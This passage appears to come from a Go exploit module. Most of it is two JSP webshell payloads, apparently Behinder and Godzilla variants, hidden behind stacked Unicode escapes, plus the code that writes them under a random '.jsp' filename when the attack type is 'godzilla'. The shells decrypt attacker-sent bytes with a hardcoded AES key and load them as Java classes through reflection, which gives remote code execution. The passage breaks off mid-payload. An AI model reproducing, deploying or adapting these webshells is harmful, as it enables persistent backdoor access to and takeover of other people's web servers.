\uuuuuuu005a\uuuuuuuuu0023\uuffe5\uuuuuuuuuu0068\uuuuuuuuu002a\uuuuuuuu0075\uuuuuuuu0040\u0021\uuuuuuu0068\uuu0033\uuuuuuuu0054\uu0039\uuuuuuu0067\uuuu0050\uu0032\uuuuuuuu0035\u0031\uuu0036\u002a\uuuuuuuuuu002f\uu0067\uuuuuuuu0065\uuu0074\uuuuuu0044\uuuu0065\uuuu0063\uuuuu006c\uu0061\uuuuuuuuu0072\uu0065\uuuuuuuuu0064\uuuuuuuu004d\uuuu0065\u0074\u0068\uuuu006f\uuuuuuuuu0064\uuu002f\uuuuuuuu002a\uuuuuu005a\uuuuuuuuuu0023\uuffe5\u0068\uuuuuu002a\uuuuuuu0075\uuuuuuu0040\u0021\uu0068\uuu0033\uuuuuuuuuu0054\uu0039\uuuuuuuuuu0067\uuuuuuuu0050\uu0032\uuuuuuuuu0035\uuuuuu0031\uuuuuuu0036\uuuu002a\uuuuu002f\uuuuuu0028\u0022\uuuuuuuuu0064\uuuuu006f\uuuuuuuuuu0046\uuuuuu0069\uuuuuuuu006e\uuuuuuuuu0061\uuuuuuu006c\uuu0022\uuu002c\uu0020\uuuuuuu006e\u0065\uuuuuu0077\uuuuuuu0020\uuuuuuuu0043\uuuuuu006c\uu0061\uuuuuuuuuu0073\u0073\uuuuuuuuu005b\uuuuuuu005d\uu007b\uuuu0062\uuu0079\uu0074\uuuuuuuu0065\uuuuuuuu005b\uuuuuu005d\uuu002e\uuuuuuu0063\uuuu006c\uuuuuuuuuu0061\uuuuuu0073\uuuuu0073\uuuu007d\u0029\uu002e\uuu0069\uu006e\uuuuuuuu0076\uuuuuuuu006f\uuu006b\uuuuuuuu0065\uuuuuu0028\uuuuuu0042\uuuuuuuuuu0074\uuuuu0073\uuuuuuuu0078\uuuuuuuu0034\u0055\uuu002c\u006e\uuuu0065\uuuuu0077\uuuu0020\uuuuuu004f\uu0062\uuuuuuu006a\uuuu0065\uuuuu0063\uuuuuuuuu0074\uuuuuuu005b\uuuuuuu005d\uuuuu007b\uuuuu0062\uuuuu0079\uuuuuuuuuu0074\uuuuuuuu0065\uuuuuuuuuu0073\uuuu007d\uuuuuu0029\uuuu003b\uuuuu0072\uuuuuuuuu0065\uu0074\uu0075\uuuu0072\uuuu006e\uuuuuuu0020\uuuuuuuu0072\uuuuuuu0065\uuuuu0073\uuuuuu0075\uu006c\uuuu0074\uuuuuuuuu003b\uuuuuuuuu007d %><% \uu0020\uuuuu0074\uuuuuuuu0072\uuuuuuuuuu0079\uu0020\u007b\u0020\uuuuuuuu0020\uuuuu0053\uuuu0074\uuu0072\uuuu0069\uuuuuuuuu006e\uuu0067\uuuuuuuuuu0020\uuuuu004b\u0037\uu0054\uuuuuuuu0039\uuuuuuuuuu0076\uuuuuuuu0039\u0071\uuuu0020\uuuuuuuu003d\u0020\uu0022\uuuuuuuuuu0065\u0066\uuuu0062\uuuuu0035\uuuuuuuuu0064\uuu0064\uuuu0034\uuuuuuuuu0034\uuuuuuuuu0032\uuuuu0034\u0032\uu0065\uuuuu0039\uuuuuuuu0037\uuuuuu0030\uuuu0033\uuu0022\uuuuuuuu003b\uuuu0020\uuuuuuuuuu0020\uuuu0073\uuuuuuuuuu0065\uuuuuuuuuu0073\uuuuuuuuuu0073\uuuuuuuu0069\uuuuuuuu006f\uuuu006e\uuuuuuuuu002e\uuuuuuuuuu0070\uuuuu0075\uuuuu0074\uuu0056\uuuu0061\uuuuuuuuu006c\uu0075\uuuuuuuu0065\uuuu0028\uuuu0022\uuuuuuuu0075\uuuuuuuuuu0022\uuuuu002c\uuu0020\uuuuuuuuuu004b\uuuuuu0037\u0054\uuuuuuu0039\uuu0076\uuuuuuuuuu0039\uuuuu0071\u0029\uuuu003b\uuuuuu0020\uuuuuuuuu0020\uuuu0062\uuuuuuu0079\uuuuuuuu0074\u0065\uuuuuuuuu005b\uuuuuu005d\uuuuuuu0020\uu0049\uuu0071\u004c\uuuuu007a\uuuuuuuu0078\uuu0030\uuuuuuu0071\uuuuuuuu0020\u003d\uuuu0020\uuu0041\uuu0033\uuuuuuu0034\u0056\uuuuuu0072\uuuuuuuu0020\uuuuuuuu0028\uuuuuu0072\uuuuuuuuu0065\uuuuuuuuu0071\uuuuuu0075\uuuuu0065\uuu0073\uuuu0074\uuu002e\u0067\uuuuuu0065\u0074\uu0052\uuuuuu0065\uuuuuuu0061\u0064\uuuuuuuuuu0065\u0072\uuuuuuuu0028\uu0029\uuuuuuu002e\uuuuuuu0072\uuuuuuuu0065\uuuuuuuuu0061\uuu0064\uuuuuuuuuu004c\uuuuuuuuu0069\uuuuuu006e\uuuuuuuu0065\uuuuuuuuuu0028\uuu0029\uuuuu002c\uuuuuuuuuu004b\uuuuuuu0037\uuuuuuuuuu0054\uu0039\uuuuuuu0076\uuuu0039\uuuuuuuuuu0071\uuuuuuuuu0029\uuuuuuuu003b\uuuuuuuu0020\u0020\uuu006a\u0061\uuuuuuuuu0076\uu0061\uuuuuuuu002e\uuuuuu002f\uuuuu002a\uuuuuu005a\uuuuuuuuuu0023\uuuuuffe5\uuuuuu0068\uuu002a\u0075\uuuuuuuu0040\uuuuuuu0021\uuuuuu0068\uuuuuuu0033\uuuuu0054\uu0039\uuuuuuu0067\uuuuuuuuuu0050\u0032\uu0035\uuuuu0031\uuuuuuu0036\uuuu002a\u002f\uuuuuuuuu006c\uuuuuuuu0061\uuuuuuuuuu006e\uuuuu0067\uuuu002e\uuuuuuu002f\uuuu002a\uuuuuuuuuu005a\uuuuuuu0023\uuuffe5\uuuuuu0068\uuuuuu002a\uu0075\uuuuuuu0040\uuuu0021\u0068\uuuuuuuu0033\uuuu0054\uuuuuu0039\uuu0067\uu0050\u0032\uuuu0035\u0031\uuuuuuuuuu0036\uuu002a\uuuuuuuuuu002f\uuuuuuuuu0072\uuuuuuuuu0065\uuuuuuuu0066\uuuuuu006c\uuuuuuuuu0065\uuuuuuu0063\uuu0074\uuuuuuu002e\uuuuuuu004d\u0065\uuuu0074\uuuuuuuuuu0068\uuuuuuu006f\uuu0064\uuuuuuu0020\uuuuu0041\uuuuu0033\uu0034\uuuuuuuu0056\uuuuu0072\uuuuuu0020\uuuuuuu003d\uuuuu0020\uuuuuu0043\uuuuuuuuuu006c\uuuuu0061\uuuu0073\uuuuuuu0073\uuu002e\u0066\uu006f\uuuuuuu0072\uuuuuuuuuu004e\uu0061\uuuuuuuu006d\uuuuuu0065\uuuuuuuuu0028\uuuuuu0022\uuuuuuu006a\uuuuuu0061\uuuuuu0076\uuuuuu0061\uuuuu002e\uuuuuuuuu006c\uuuuuu0061\uuuuuu006e\uuu0067\uuuuuuuuu002e\uuuuu0043\uuuuuuu006c\u0061\uuuuuuuuu0073\uuuuuuuu0073\uuuuu004c\uuuuuuuuuu006f\uu0061\uuuuuu0064\uuuuuuuuuu0065\uuuu0072\uuuuuuuuu0022\uuuuuu0029\uuu002e\uuuuuuuuu0067\uuuuuu0065\uuuuuu0074\uu0044\uuuu0065\uuuuu0063\uuuu006c\uuuuu0061\uuuuuuuuu0072\uuuu0065\uuuuu0064\uuuuuu004d\uuuuuuu0065\uuuuuuuu0074\uuuu0068\uuu006f\uu0064\uuu002f\uuuu002a\uuuuuuuuu005a\uuuuuuuuu0023\uuuffe5\uuuuuuuuu0068\uuuuuuuu002a\uu0075\uuuuu0040\uu0021\uuuuuuuu0068\uuuuuuu0033\uuuu0054\uu0039\u0067\uuuuu0050\uuuuuuuuu0032\u0035\uuuuuuuuuu0031\uuu0036\uuuuu002a\uuuuuuuu002f\uu0028\uuuuuuuuuu0022\uuuu0064\uuu0065\uuu0066\uu0069\uuuuu006e\uuu0065\uu0043\uuuuuu006c\uu0061\uuuuuu0073\uuuu0073\uuuuu0022\uuuuu002c\uuu0062\uuuuuuuu0079\uuu0074\uuuuu0065\uuuuu005b\uuuuuu005d\uuuuuuuuuu002e\uuuuu0063\uuu006c\uuuuuuuu0061\uuuuuuu0073\uuu0073\uuuuuu002c\uuuu0069\uuuuu006e\uuuuu0074\uuuu002f\uuuuuuu002a\uuuuuuu002a\uuuu002f\u002e\uuuuuuuuuu0063\u006c\uuuuuuuuuu0061\uuuu0073\uuuu0073\u002c\uuuuuuuuuu0069\uuuuuuuuu006e\uuuuuuuuu0074\u002f\u002a\uuuuu002a\uuuuuu002f\uuuuu002e\uuuuu0063\u006c\uuuuuuu0061\uu0073\uuuu0073\uu0029\uuuuuuu003b\uuuuuuu0020\uuuuuu0020\uuuuuuu0041\uuuuuuu0033\uu0034\u0056\uuuuuuuuu0072\uuuuu002e\u0073\uuuuuuuuuu0065\uuuuuuuuu0074\uuuuuuuuu0041\uuuuuuu0063\uuuuuuu0063\uu0065\uuuuuuuuu0073\uu0073\uuuuuu0069\uuuuuuu0062\uuuuuu006c\uuuuu0065\uuuuuuu0028\uuuu0074\uuu0072\uuuu0075\u0065\uu0029\uuuuuuuu003b\uu0020\uuuuuuuuuu0020\uuuu0043\uuuuu006c\uuuuu0061\uuuuuuuu0073\uuu0073\uuuuuuuuu0020\uuuuuuuu0069\uu0020\uuuuu003d\uuuuu0020\uuuuuuu0028\u0043\uuuuuuuuu006c\uuuuuuuu0061\uuuuu0073\uuuuuuuuu0073\uuuuuuuuuu0029\uuuuuuuuu0041\uuu0033\uuuuuuuu0034\uuuuuuuu0056\uuuuuuuu0072\uuuuuuuu002e\uuuuuuu0069\uuuuuuu006e\uuuuuuuuuu0076\u006f\uuuuuuuuuu006b\uu0065\uuuuu0028\uuuuuuuuu0054\uuuuuuu0068\uuuuuuuuuu0072\uuuuuuuu0065\uuu0061\uuuuuuuu0064\uuu002e\uuuuuu0063\uuu0075\uuuuu0072\uuuuu0072\uuuuuuuu0065\u006e\uu0074\uuuu0054\uuu0068\uuuu0072\uuu0065\uuuuuuu0061\uuuuuuuuu0064\uuuuuuuuuu0028\u0029\uuu002e\uuuuuuu002f\uuuuuuuuu002a\uuuuuuuuuu005a\uuuuu0023\uuuffe5\u0068\uuuuuuuuuu002a\uuu0075\uuuuu0040\uuuuu0021\uuu0068\uuuu0033\uuuuuuu0054\uuu0039\uuuuuuuuu0067\uuuuuuu0050\uuuuuuu0032\uu0035\uuuuuuuuuu0031\uuuu0036\uuuuuuuu002a\uuuu002f\uuuuu0067\uuu0065\uuuuuuuu0074\uuu0043\uuu006f\uu006e\uu0074\uuuuuu0065\uuuuuuuuuu0078\uuuuuu0074\uuuu0043\uuuuuuu006c\uuuuuuuuu0061\uu0073\uuuuu0073\uuuuuuu004c\uuuuuuu006f\uuuuuuuuu0061\uuu0064\uuuuuuuuuu0065\uuu0072\uuuu0028\uuuuuu0029\uuuuuuuuu002c\uuuu0020\uuuuuuuu0049\uuuu0071\u004c\uuuuuuuuuu007a\uuuuuuuuuu0078\uuuuuuuu0030\u0071\uuuuuuuu0020\uuuuu002c\uuuuuuu0020\uuu0030\u002c\uuuuu0020\uuuuuuuu0049\u0071\uuuuuu004c\u007a\uuuu0078\uuuuuuuu0030\uuuuuuuuuu0071\uuuuu002e\uuu006c\uuuuuu0065\uuuuuu006e\uuuuuuuuuu0067\uuu0074\uuuuuuuuu0068\uuuuu0029\uuuu003b\uuuu0020\uuuuuuuuu0020\uuuuuuuu004f\uuu0062\uu006a\uuuuuuu0065\uuuuuuu0063\uuuuuuuu0074\uuuuu0020\uuuu0051\uuuuuu0038\uuuuuu0075\uuuu004c\uu0020\uuuuuuu003d\uuuuuuuuuu0020\uuuuuuuuuu0069\uuuuuuuuuu002e\uu002f\uuuuuuuu002a\u005a\uuuuuuu0023\uuuuuuffe5\uuu0068\uu002a\uuuuu0075\uuuuuu0040\uuuuuuuu0021\uuuuu0068\u0033\uuuuuuuuuu0054\uuuuuu0039\uuuuuuuuu0067\uuuuuuuuu0050\uuuuuuu0032\uuuuuuuuuu0035\uuuu0031\uuuuuuu0036\uuuuu002a\uuu002f\uuuuuuuuuu006e\uuuuu0065\uuuuuuuu0077\uuuuuuuuu0049\u006e\uuuuuuuuuu0073\uuuuuuuu0074\uuuuuu0061\u006e\uuuuuu0063\uu0065\u0028\uuuuuuuuu0029\u003b\uuuu0020\u0020\uuuuu0051\uuuuuu0038\uuuuuuu0075\uu004c\uuu002e\uuuuuuuuuu0065\uuu0071\uuuuuuu0075\uuuuuuuuu0061\uu006c\uuuu0073\uuu0028\u0070\uuuuuuuuu0061\uuu0067\uuuuuuu0065\uuuuuuuuu0043\uuuu006f\uuuuuu006e\uuuuuuuuu0074\uuuuuu0065\uu0078\uu0074\u0029\uuuuuuu003b\uuuuuuuuu0020\uuuu007d\uuu0020\uuuuuuuuuu0063\uuu0061\uuu0074\uuuuuuuu0063\uuuuuuu0068\uuu0020\uuu0028\uuuuuuuuu0045\uuuuuuu0078\uuuuuuuu0063\uuuuuuu0065\uu0070\uuuu0074\uuuu0069\u006f\uuuuuuuuuu006e\uuuuu0020\uuuu0065\uuuu0029\uuuuu0020\uu007b\u007d %>`
			} else if attackType == "godzilla" {
				filename = goutils.RandomHexString(10) + ".jsp"
				content = `<%!//\uuu000a\u0070\uuuuuuu0075\uuu0062\uu006c\uuu0069\u0063\uuu0020\uuuuuuuuuu0062\uuuuuuuuuu0079\uuuuu0074\uuuuuuuuu0065\uuuuuuu005b\uuu005d\uuuuuuuuuu0020\uuuuuuuuuu0041\uuuuuu0044\uuuuuuuuu0046\uuu0031\uuuuuuuu0030\uu0028\uu0062\uuuu0079\uuu0074\uuuuuuu0065\uuuuuu005b\uu005d\uuuuuu0020\uuu0073\u002c\u0020\uu0062\uuuuuuuuuu006f\uuuuuuuuuu006f\uuuuuuuuuu006c\uu0065\uuu0061\uuu006e\u0020\uuuuuu006d\uuuu0029\uuuuuu0020\uuuuuu007b\uuuuuuu0074\uu0072\uuuuuuuu0079\uuuuuuuuuu0020\uuuuuu007b\u006a\uuuuuuuuu0061\uuuuuuuuu0076\uuuuuu0061\uuuuuuuuu0078\uuuuu002e\uuuuuuuuuu0063\uuuuu0072\uuuuuuuuu0079\uu0070\uuuuuuuuu0074\uuuu006f\uu002e\uuuuuuu0043\uuu0069\uuuuuuuuuu0070\u0068\uuuu0065\uuuuuuuuu0072\uuuuu0020\uuuuuuu0042\uuuuuuu0030\uu0065\uu0076\uu0041\uuu006e\uuuuuu0020\uuuuuuu003d\uu0020\uuuuu006a\uuuuuuuuu0061\uuuu0076\uuuuuuuu0061\uuuuuuuuuu0078\uuuu002e\u0063\uuuu0072\uuuuuuu0079\uuuu0070\uuuuu0074\uuuu006f\uuuuuuu002e\uuuuuuu0043\uuuuuuu0069\uuuuuu0070\uuuu0068\uuuu0065\uuu0072\uuuu002e\u0067\uuuuuu0065\uu0074\u0049\uuuuuuuuu006e\uuuuuuuu0073\uuuuuuu0074\uuuuuuu0061\uuuu006e\uuuuuuuuu0063\uuu0065\uuuuuuuu0028\uuuu0022\u0041\uuu0045\uuuuu0053\uu002f\u0045\uuuuuu0043\uu0042\uuuuuuuuu002f\u0050\uuuuuuu004b\uuuuuuuuu0043\u0053\uuuuuuu0035\uuuu0050\uuuuuuuuu0061\uuuuu0064\uuuuuuu0064\uuuu0069\uuuuuuuu006e\u0067\uuu0022\uuu0029\uuuuuuuu003b\uuuuuuuuu0042\u0030\uuuuuuuuu0065\uuuuuuuu0076\uuuuuu0041\uuuuu006e\uuuuuuuuu002e\uuuuuuuu0069\uuuu006e\uuuuuuu0069\uuu0074\u0028\uu006d\uuuuu0020\uu003f\u0020\uuuuuuuuuu0031\uuuuuu0020\uu003a\uuuuuu0020\uu0032\uu002c\u0028\uuuuu006a\uuuuuuuuu0061\uuuuu0076\uuuuuuu0061\uuuuuu0078\uuuuuuuuu002e\uuuuuuuu0063\uuuu0072\uuuuuuuuuu0079\uuuuu0070\uuuuuu0074\uuuuuuuuu006f\uuuuu002e\uuu0073\uuuuuuuu0070\uu0065\uuuuuu0063\uuuuu002e\uuuuuuu0053\u0065\uuuuuuuuu0063\uuuuuu0072\uuuuu0065\uuu0074\uu004b\uu0065\uuuuu0079\uuuuuuuuu0053\uuuuuu0070\uuuuuuuuuu0065\uuuuuuuuu0063\uuuuuu0029\uuuuuuuuuu0020\uuuuuuuu0043\u006c\uuuuuuuu0061\uuuuuuu0073\uuu0073\uuuuuuu002e\uu0066\uuuuuuuuuu006f\u0072\uuu004e\u0061\uuuuuuuuuu006d\u0065\uuuuuuuu0028\uuuuuu0022\uuuuuuuuuu006a\uu0061\uuuuuuuu0076\uuuuuuuu0061\u0078\uuuuuu002e\uuuuuu0063\u0072\uuuuuuuu0079\uu0070\uuu0074\uuuuu006f\u002e\uuuu0073\uuu0070\uuu0065\uuuuuuuu0063\uuuuuuu002e\uu0053\u0065\u0063\uuuuuu0072\uuuuuuuuu0065\uu0074\uuuuu004b\u0065\u0079\uu0053\uuuu0070\uuuuuuu0065\uuuuuuuu0063\uuuu0022\uuuuuuuuuu0029\u002e\uuuu0067\u0065\uuuuuuuuuu0074\uuu0043\uuuuu006f\uu006e\uuuuu0073\u0074\uuuuuuuuu0072\uuuu0075\uuuuuu0063\uuuu0074\uu006f\uu0072\uuuuu0028\uuu0062\uuuuu0079\uuuuuuuuu0074\uuuu0065\uuuuuu005b\uuuuuuuuu005d\uuuuuuu002e\uuuuuuuuuu0063\uuuuuuuu006c\u0061\uuuuuuu0073\u0073\uuuuuu002c\uuuuuuu0020\uuuuuu0053\uuuuuuuuuu0074\uuuuuuuuu0072\uuuuuuuuu0069\u006e\uuuuuuu0067\uuuuuuu002e\uuuuuu0063\uuuuu006c\u0061\uuu0073\uuuuuuu0073\uuu0029\uuu002e\uuuu006e\uuuuu0065\uu0077\uuuuuuuuu0049\uuuuuu006e\uuuuuuu0073\u0074\uuuu0061\uu006e\uuuuuuuu0063\uuu0065\uuuuuuu0028\uuuuuuuu0022\uuuuuu0065\uuuuuu0066\uuuu0062\uuuuuuuu0035\uuuuuu0064\uu0064\uuuuuuuuu0034\uuuuu0034\uuuuuuu0032\uuuuuuuuu0034\uuuuuu0032\uuuuuuuu0065\uuuuuuuu0039\uuuuuuuuuu0037\uuuu0030\uuuu0033\uuuuuu0022\uuuuuuuuuu002e\uuu0067\uuuuuuuuu0065\uuuuuu0074\u0042\uuuuuuuuu0079\uuu0074\uu0065\uuuu0073\uuuuuuuuu0028\uuuuuuuu0029\uuuuu002c\uuuuuuuuu0020\uuuuuuuuuu0022\uuuuu0041\uuuuuuuuuu0045\uuu0053\uuuuu0022\uuuuuuu0029\uuuuuuuuu0029\uuu003b\uuuuuuuu0062\uuuuuuuuuu0079\uu0074\uuu0065\uuuuuuuuu005b\uuuu005d\uuuuuuuuu0020\uuu0072\uuu0065\uuuuuuuu0073\uuuuuuu0075\uu006c\uuuuuuuuu0074\uu0020\uuuuuuu003d\uuuuu0020\u0028\u0062\uuuuuuu0079\uuuuuuuu0074\uuuuuu0065\uuuuuu005b\uuu005d\uu0029\uu0020\uuu0042\uuuu0030\u0065\uuuuuuuu0076\uuuuuuuuuu0041\uu006e\uuuu002e\uuu0067\uuuuuu0065\uuu0074\uuuu0043\uuuuuuuu006c\uuuuu0061\uuuuu0073\uuuu0073\u0028\uuuu0029\uuuuuuuuuu002e\uuuuuuuuu0067\uuuuuu0065\uuuuuu0074\uuuuuuuu0044\uuuuuuu0065\u0063\uuuuu006c\uuuuu0061\uuuuuuuu0072\uuuuuuuuu0065\u0064\uuuuuuu004d\uuuuuuu0065\uuuuuu0074\uuuuuuuu0068\uuuuuuuuu006f\uuuuuuuu0064\uuuuuuu0028\uu0022\uuuuuuuuu0064\uuuuuu006f\uuuu0046\uuuuu0069\uuuuuuuuu006e\uuu0061\uuuuuuuuu006c\uuu0022\uuuuuuuu002c\uuuuuuuuu0020\uuuuuuuuuu006e\uu0065\uuuu0077\u0020\uu0043\uuuu006c\uuuuuuu0061\uuuu0073\uuuuuuuuu0073\u005b\u005d\uuu007b\uuuu0062\uuuuu0079\uuuuuuuu0074\uuuu0065\uuuuuuuuuu005b\u005d\uu002e\uuuuuuuuu0063\uuuuuuu006c\uuuuuuuu0061\uuu0073\uuuuuuuu0073\uuuuuuuu007d\uu0029\uuuuuuu002e\uuuuuuuu0069\uuuuuuuuu006e\uuuuu0076\uuuuu006f\uuuu006b\uuuuuuuuuu0065\uuu0028\uuuuuuuu0042\uuuuuuuuu0030\uuuu0065\uuuuuu0076\u0041\uuuuuuuuu006e\uuuuuuuuuu002c\uuuuuuuuuu0020\u006e\uuuuuuu0065\uuu0077\uuuuuuuu0020\uu004f\uuuuuu0062\u006a\uu0065\uuuuu0063\uuuuu0074\uuu005b\uu005d\uuuuu007b\uuuuuu0073\uu007d\u0029\uuuuuuu003b\uuuuuu0072\u0065\uuuuuuuu0074\uuuuuuuu0075\u0072\uu006e\uuuuuu0020\uuuuuu0072\uuuuuuuuuu0065\uuu0073\uuuu0075\uuuuu006c\uuuuuuuu0074\uuuu003b\u007d\uuuu0020\uuuuuuuuuu0063\uuuuu0061\uu0074\uuuuuuu0063\u0068\uu0020\uuuuuuuuuu0028\uu0045\uuuu0078\uuuuuuuuu0063\uuuuuu0065\uuu0070\uuuuuuuuu0074\u0069\uuuu006f\uuuuuuuuu006e\uuuuuu0020\u0065\uu0029\uuuuuuuu0020\uuuuuuu007b\uuu0072\uuuuuuuu0065\uuuuuuu0074\uu0075\uuuu0072\uuuuuu006e\uuuuuu0020\uuuuuuuuu006e\uuu0075\uuuuuu006c\uuuuu006c\uuuuuuuu003b\uuu007d\uuuuu007d %><% \u0074\uuuuuuu0072\uuuuuuu0079\uuuuuu0020\uuu007b\uuuuuuuu0062\uuuuuuuuuu0079\uuu0074\uuuuuuu0065\uu005b\uuu005d\uuu0020\uuuuuuuuu0043\uuuuuuuuu0078\u007a\uuu0031\u0020\uu003d\uuuuuuuuu0020\u006e\uuuuuu0065\uuuu0077\uuuuuuuu0020\uuuuuuu0062\uuuuu0079\uuuuuuu0074\uuuuuu0065\uu005b\uuuuuu0049\uuu006e\uuu0074\uuuuuu0065\uuuuu0067\uu0065\uuuuuu0072\uuuuuuuuuu002e\uu0070\uuuu0061\uuuuuu0072\uuuuuuuuuu0073\uuuu0065\uuuu0049\uuu006e\uu0074\uuuuuuuu0028\uuuuuuuu0072\uuuuuu0065\uuuu0071\uuuuuu0075\u0065\uuuuuuuu0073\u0074\uuuuuuu002e\uuuuuuuuuu0067\uuuuuu0065\u0074\uuuuuuu0048\uuuuuu0065\uuuuuuu0061\uuu0064\uuuuuuuuu0065\uuuuu0072\uuuu0028\uuu0022\uuuuuuuu0043\uuuuuuuuu006f\uuuuuuuuu006e\uuuuu0074\uu0065\u006e\uuu0074\uuuuuuuu002d\uuuuuu004c\uuuuuuuuuu0065\uuuuu006e\uu0067\uuu0074\uuuuuuuuu0068\uuuu0022\uuuuuuuuuu0029\uuu0029\uuuuuu005d\uuu003b\uuuu006a\uuuuuuuu0061\u0076\uuuuuuu0061\uuu002e\uuuuuuuuuu0069\uuuu006f\uuuuuuuuuu002e\uuuuuu0049\uuuuuuu006e\uuuuuuuuu0070\uuuuuuuuu0075\uuuuuuuu0074\uuuuu0053\uuuu0074\uuuuuu0072\uuuuuuuuu0065\uuuu0061\uuuuu006d\uuuuuuuuuu0020\uu0069\uuu006e\uuuuuuuuu0070\uuuuuuu0075\uuuuu0074\u0053\uu0074\uuuuu0072\uuuuuuuuuu0065\uuu0061\uuuu006d\uuuuuuuuu0020\uuuuuuu003d\uuuuuuuuu0020\uuuuuu0072\uuuuuuu0065\uuuu0071\uu0075\uuuuuuuu0065\uuuu0073\uuuu0074\uu002e\uuuuuuu0067\uuuuuuu0065\u0074\u0049\uuuuuuuu006e\uuuuuuu0070\uuuuuuuuuu0075\uu0074\uuuuuu0053\uuuuuu0074\u0072\uuuuuuuuuu0065\uu0061\uuuuuuuuuu006d\uuuuuuuuu0028\uuuuu0029\uuuuuuuuuu003b\uuuu0069\uuuuuuuuuu006e\uuuu0074\uuuuuuuu0020\uuuu005f\uuu006e\uu0075\uuuuuu006d\uuu0020\uuuuuuuuu003d\uuuuu0020\uuuuuu0030\uuuuuuuuuu003b\uuuuuuuu0077\uuu0068\uuuuuu0069\uu006c\uuuuuuuu0065\uuuuuuuu0020\uuuuuuuuuu0028\uuuuuuuu0028\uuuuu005f\uuuu006e\uuuuuuuu0075\uuuuuuuuuu006d\u0020\uu002b\uuuuuuuuuu003d\uuuu0020\uuuuu0069\uuuuuuuuu006e\uuuuuuuuu0070\uuuuuuuuu0075\uuuuuuu0074\uuuuu0053\uuuuuuuu0074\uuuu0072\uuu0065\uu0061\uuuuuuu006d\uuuuuu002e\uuuuuu0072\uuuuuuuuuu0065\uuuuuuuu0061\uu0064\uuuuuuu0028\uuuuuu0043\uuuu0078\uuuuuuuuu007a\uuuu0031\uu002c\uuuuuu0020\uuuu005f\uu006e\uuuuuuuuu0075\uuuuuuu006d\uuuuuuu002c\uuuuu0020\uuuuuuu0043\uuu0078\uuuuuuuuuu007a\uuuuuuu0031\uuuuuuuu002e\u006c\uuu0065\uuuuuuuu006e\uuuuuu0067\uuuuuuuu0074\uuuu0068\uu0029\uuuuuu0029\u0020\uuuuuu003c\uuuuuuuu0020\uuuuuuu0043\u0078\u007a\uuuuuuuu0031\uu002e\uuuuuuuuuu006c\uuuuuuuuuu0065\uuuuuuuuu006e\uuuu0067\uuuuuuu0074\uuuuuuuuu0068\uuu0029\uuuuu0020\uuuuuuuu003b\uuuuuuuu0043\uuu0078\uuuuuuuuu007a\uuuuu0031\uuuuuu0020\uuuuuu003d\uuuu0020\uuuuuuu0041\uu0044\uuuuuuuuuu0046\uuuuuuuu0031\uuu0030\u0028\uuuuu0043\uuuuuuuu0078\uuuuuuuuuu007a\uuuu0031\u002c\uu0020\uuuuu0066\uuuuuuuu0061\uuuuuuuuu006c\uuuuu0073\uuuu0065\uuuuuuuu0029\uuu003b\uuuuuuuuuu0069\uuuuuuu0066\uu0020\uuuuuu0028\uuuuu0073\uuuuuu0065\uuuu0073\uuuuuuuuuu0073\uuuu0069\uuuuuuuuuu006f\uuuuu006e\uuuuuuu002e\u0067\uuuuuuuu0065\uuu0074\uuuuuuuu0041\uuuuuuu0074\uu0074\uuuuuuuuu0072\uuuuuu0069\uuuuuu0062\uuuuuuuu0075\uuuuuuuuuu0074\uuu0065\uuuuuuu0028\uuuuuuu0022\uuuuuuuuuu0074\uuuuuuuuuu0069\uuuuu0022\uuuuuuuuu0029\uuuu0020\uuuuuuuu003d\uuuuuu003d\uuuuuuu0020\uuuuuuu006e\uuuuuuu0075\uuuuu006c\uuuu006c\uuuuuuu0029\uuuuuuuuuu0020\uuuuuuuuuu007b\uuuu0043\uuuuuuuuu006c\uuuuuuu0061\uuuuuuu0073\uuuuuu0073\u0020\u0050\uuu0042\uuuuu003d\uuuu0043\uuuuu006c\uuuuuuuu0061\uuuuuuuu0073\uuuuuuu0073\uuuu002e\uuuu0066\uuuuuuu006f\uuuuuuuu0072\u004e\uuuu0061\uuuuuuuuu006d\uuuuuuuuuu0065\uuuuu0028\uuuuuuuuuu0022\u0063\u006f\uuuu006d\uuuuuu002e\uuuuuu0073\u0075\uuu006e\uuuuuuu002e\uuuuuuuuu006a\uuuuuuuu006d\uuuuuuu0078\uuuuuuuu002e\uuuuuu0072\uuuuuuuu0065\uuuuuuuuuu006d\uuuuuuu006f\uuuuuuuuuu0074\uuuu0065\uuuuuuuu002e\uu0075\uuuuuuuuu0074\u0069\uuuuuuuuuu006c\uuuuuuu002e\uuuuuuuu004f\uuu0072\uuuu0064\uu0065\uuuu0072\uuuuuuuuu0043\uuuuuuuuuu006c\uuuu0061\uuu0073\uuuuuuuuuu0073\uuuuuu004c\u006f\uuuu0061\uuuuuuuu0064\uuuuuu0065\uuuu0072\uuuuuuuuu0073\u0022\uuuuuuuuuu0029\uuuu003b\uuuuu006a\uuuuuuuuu0061\uuu0076\uuu0061\uuuu002e\uuuuu006c\uuuuuu0061\uuuuu006e\uuuuu0067\uuuuuuuuu002e\uuu0072\uuuu0065\uuuuu0066\uuuuuu006c\u0065\uuu0063\uuu0074\uuuuuuuu002e\uuuuuuuuuu0043\uuuuuuuuu006f\uuuuuuuu006e\u0073\uuu0074\uuuuuuuuuu0072\uuuuuuuu0075\uuuu0063\uuuuu0074\uuuuuuu006f\uu0072\uuuuuuuuuu0020\uuuuuuuuuu0063\uuuu0020\uuuuu003d\uuuuuuuu0020\uuuuuuuuuu0050\uuuuuuuuu0042\uu002e\uuuuuuuuu0067\uuuuuuuu0065\uu0074\uuuu0044\u0065\uuuuuuuu0063\uuuuuu006c\uu0061\uuuuuuuu0072\uuuu0065\uu0064\u0043\uuuu006f\uuuuuuuu006e\uuuu0073\uuuuuuuuu0074\uuuuuuuuu0072\uuuuuuuuuu0075\uuuuuuuuu0063\uu0074\uuuuuuuu006f\uu0072\uuuuuuuuuu0028\uu006e\uuuuu0065\u0077\uu0020\uu0043\uuuu006c\uuuu0061\uuuuuuuu0073\uuuuuuuu0073\uuuuu005b\u005d\uuu007b\uuuu0043\uuu006c\uuuu0061\uuuuuuu0073\uuu0073\uu004c\uuuuu006f\u0061\uuuuuuuuuu0064\uuuuuuuuuu0065\uuuuuuuuu0072\uuuuuu002e\uuuuuuuuu0063\uuuuuuuuuu006c\u0061\u0073\uuuuu0073\uuuuu002c\uuuuu0043\uuu006c\uuuuuuu0061\uu0073\uuuuuuuu0073\u004c\uuuuuuu006f\uu0061\uuu0064\uuu0065\uuuuuuuuu0072\uuuuuu002e\uuuuuu0063\uuuuuuuuu006c\uuuuuuuuuu0061\uuuuuu0073\uuuuuuuuu0073\uuuuuuuuu007d\uuuuuu0029\uuuuuuuuu003b\uuuuuuu0063\uuuuuuuu002e\uuuuuuuu0073\uuu0065